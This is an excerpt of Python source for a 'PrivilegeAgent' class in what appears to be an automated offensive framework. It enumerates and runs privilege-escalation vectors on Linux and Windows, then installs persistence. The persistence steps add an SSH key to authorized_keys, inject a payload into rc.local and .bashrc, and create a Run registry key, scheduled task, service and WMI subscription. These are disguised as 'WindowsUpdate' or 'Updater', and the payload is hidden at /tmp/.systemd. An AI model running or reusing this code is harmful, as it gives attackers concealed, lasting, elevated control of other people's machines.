...
class PrivilegeAgent(BaseAgent):
    ...
    LINUX_ESCALATION_METHODS = {
        ...
        "suid": {
            ...
            "detect_commands": ["find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null | head -30"],
            "priority": 2,
            "exploitable_bins": ["bash", "dash", "python", "python3", "perl", "php", "ruby", "node"]
        },
        "capabilities": {
            "description": "Linux Capabilities 提权",
            "detect_commands": ["getcap -r / 2>/dev/null | grep -E 'cap_setuid|cap_sys_admin'"],
            "priority": 3,
    ...
    WINDOWS_ESCALATION_METHODS = {
        ...
        "service_path": {
            "description": "未引号服务路径",
            "detect_commands": ['wmic service get name,pathname | findstr /i /v "C:\\Windows" | findstr /i /v "\\\""'],
            "priority": 2,
            "exploitable_indicators": []
        },
        "service_permission": {
            "description": "弱服务权限",
            "detect_commands": ['accesschk.exe -uwcqv "Authenticated Users" * /accepteula 2>nul'],
            "priority": 3,
            "exploitable_indicators": []
        },
        "token": {
        ...
        "scheduled_task": {
            "description": "可写计划任务",
            "detect_commands": ['schtasks /query /fo LIST /v | findstr /i "Task To Run"'],
            "priority": 5,
            "exploitable_indicators": []
        }
    }
    ...
    def __init__(
        ...
        self._payload_path = config.get("payload_path", "/tmp/.systemd") if config else "/tmp/.systemd"
    def set_shell_executor(self, shell_executor):
        """注入 shell 执行器对象"""
        self._shell_executor = shell_executor
    async def _execute_command(self, command: str, timeout: Optional[int] = None) -> Dict[str, Any]:
        """通过注入的 shell 执行命令"""
        ...
        try:
            ...
            if isinstance(raw_result, dict):
                ...
                error = ""
                success = True
            return {"success": success, "output": output.strip(), "error": error.strip()}
    ...
    async def execute(self, target: str, context: Dict[str, Any] = None) -> Dict[str, Any]:
        ...
        try:
            ...
            logger.info(f"Target OS: {self._os_type} ({os_info.get('os_version', 'unknown')})")
    ...
    async def _check_current_privileges(self, context: Dict) -> List[Dict]:
        ...
        if self._shell_executor:
            whoami = await self._execute_command("whoami 2>nul || id -un 2>/dev/null || echo unknown")
            if whoami.get("success"):
                user = whoami.get("output", "").strip()
                privileges.append({"type": "current_user", "value": user, "status": "checked"})
                if user in ["root", "Administrator", "NT AUTHORITY\\SYSTEM"]:
                    privileges.append({"type": "privilege_level", "level": "high", "note": "Already elevated"})
                else:
                    if self._os_type == "linux":
                        sudo_check = await self._execute_command("sudo -n -l 2>/dev/null | head -1")
    ...
    async def _detect_os(self) -> Dict[str, Any]:
        ...
        if uname and "linux" in uname:
            ...
            release = await self._execute_command("cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2")
    ...
    async def _enumerate_escalation_vectors(self) -> List[Dict]:
        vectors = []
        methods = self.LINUX_ESCALATION_METHODS if self._os_type == "linux" else self.WINDOWS_ESCALATION_METHODS
    ...
    async def _execute_escalation(self, vectors: List[Dict]) -> Dict[str, Any]:
        ...
        for vector in exploitable:
            ...
            attempt = {"method": method, "description": vector["description"], "status": "failed", "output": ""}
            ...
            if exploit_cmd:
                ...
                if self._check_escalation_success(cmd_result.get("output", "")):
                    ...
                    result["success"] = True
                    result["privileges"].append({"method": method, "level": "elevated", "evidence": cmd_result.get("output", "")[:200]})
                    ...
                    if "root" in check.get("output", "") or "SYSTEM" in check.get("output", ""):
                        attempt["status"] = "success"
                        result["success"] = True
                        result["privileges"].append({"method": method, "level": "elevated"})
                        result["methods_attempted"].append(attempt)
                        break
            result["methods_attempted"].append(attempt)
        if not result["success"]:
            who = await self._execute_command("whoami 2>nul || id -un")
            result["privileges"].append({"method": "initial", "level": who.get("output", "unknown").strip()})
        return result
    ...
    def _check_escalation_success(self, output: str) -> bool:
        if not output:
            return False
        output_lower = output.lower()
        indicators = ["uid=0", "root", "suid_success", "docker_success", "nt authority\\system", "system", "cron_success"]
        return any(ind in output_lower for ind in indicators)
    async def _establish_persistence(self) -> List[Dict]:
        persistence = []
        methods = self.LINUX_PERSISTENCE if self._os_type == "linux" else self.WINDOWS_PERSISTENCE
    ...
    def _get_persistence_commands(self, method: str) -> List[str]:
        ...
        if self._os_type == "linux":
            commands = {
                ...
                "ssh_key": ["mkdir -p ~/.ssh", f"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB...' >> ~/.ssh/authorized_keys"],
                "rc_local": [f"echo '{payload} &' >> /etc/rc.local"],
                "bashrc": [f"echo '{payload} &' >> ~/.bashrc"]
            }
        else:
            commands = {
                "registry_run": [f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "{payload}" /f'],
                "scheduled_task": [f'schtasks /create /tn "WindowsUpdate" /tr "{payload}" /sc ONLOGON /f'],
                "service": [f'sc create "WinUpdater" binPath= "{payload}" start= auto'],
                "wmi_event": [f'wmic /namespace:"\\\\root\\subscription" PATH __EventFilter CREATE Name="Updater", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"']
            }
    ...
    def report(self) -> Dict[str, Any]:
        ...
        exploitable_count = len([v for v in ctx.get("escalation_methods", []) if v.get("exploitable")])
        return {
            "agent": self.name,
